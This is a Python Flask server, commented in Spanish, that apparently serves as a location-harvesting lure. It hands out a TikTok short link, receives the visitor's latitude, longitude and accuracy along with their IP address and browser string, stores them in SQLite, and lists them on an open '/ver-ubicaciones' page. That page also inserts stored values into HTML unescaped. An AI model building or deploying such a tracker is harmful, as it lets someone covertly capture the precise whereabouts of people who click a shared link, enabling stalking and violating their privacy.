from flask import Flask, request, jsonify, render_template, redirect
from datetime import datetime
import sqlite3
import os
import threading
import time

app = Flask(__name__)
TARGET_TIKTOK = "https://vt.tiktok.com/ZSVY3uMuh/"

# Inicializar base de datos
def init_db():
    conn = sqlite3.connect('locations.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS locations
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  ip TEXT,
                  user_agent TEXT,
                  latitude REAL,
                  longitude REAL,
                  accuracy REAL,
                  session_id TEXT)''')
    conn.commit()
    conn.close()

init_db()

def get_client_ip():
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr or 'unknown'

@app.route('/')
def index():
    return render_template('index.html', target_tiktok=TARGET_TIKTOK)

@app.route('/guardar-ubicacion', methods=['POST'])
def guardar_ubicacion():
    try:
        data = request.get_json(silent=True) or {}
        lat = data.get('latitud')
        lon = data.get('longitud')
        accuracy = data.get('precision')
        session_id = data.get('session_id', 'unknown')
        
        client_ip = get_client_ip()
        user_agent = request.headers.get('User-Agent', '')[:500]
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Guardar en base de datos
        conn = sqlite3.connect('locations.db')
        c = conn.cursor()
        c.execute("""INSERT INTO locations (timestamp, ip, user_agent, latitude, longitude, accuracy, session_id) 
                     VALUES (?, ?, ?, ?, ?, ?, ?)""",
                  (now, client_ip, user_agent, lat, lon, accuracy, session_id))
        conn.commit()
        conn.close()
        
        print(f"[{now}] UBICACIÓN GUARDADA: IP={client_ip} | LAT={lat} | LON={lon} | PRECISIÓN={accuracy}m", flush=True)
        
        return jsonify({"status": "success", "message": "Ubicación guardada"}), 200
    except Exception as e:
        print(f"ERROR en /guardar-ubicacion: {str(e)}", flush=True)
        return jsonify({"status": "error", "message": "Error interno"}), 500

@app.route('/ver-ubicaciones')
def ver_ubicaciones():
    try:
        conn = sqlite3.connect('locations.db')
        c = conn.cursor()
        c.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 50")
        locations = c.fetchall()
        conn.close()
        
        # Formatear como HTML para visualización
        html = "<h1>Ubicaciones Registradas</h1><table border='1'><tr><th>ID</th><th>Fecha</th><th>IP</th><th>Lat</th><th>Lon</th><th>Precisión</th></tr>"
        for loc in locations:
            html += f"<tr><td>{loc[0]}</td><td>{loc[1]}</td><td>{loc[2]}</td><td>{loc[4]}</td><td>{loc[5]}</td><td>{loc[6]}m</td></tr>"
        html += "</table>"
        
        return html
    except Exception as e:
        return f"Error: {str(e)}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
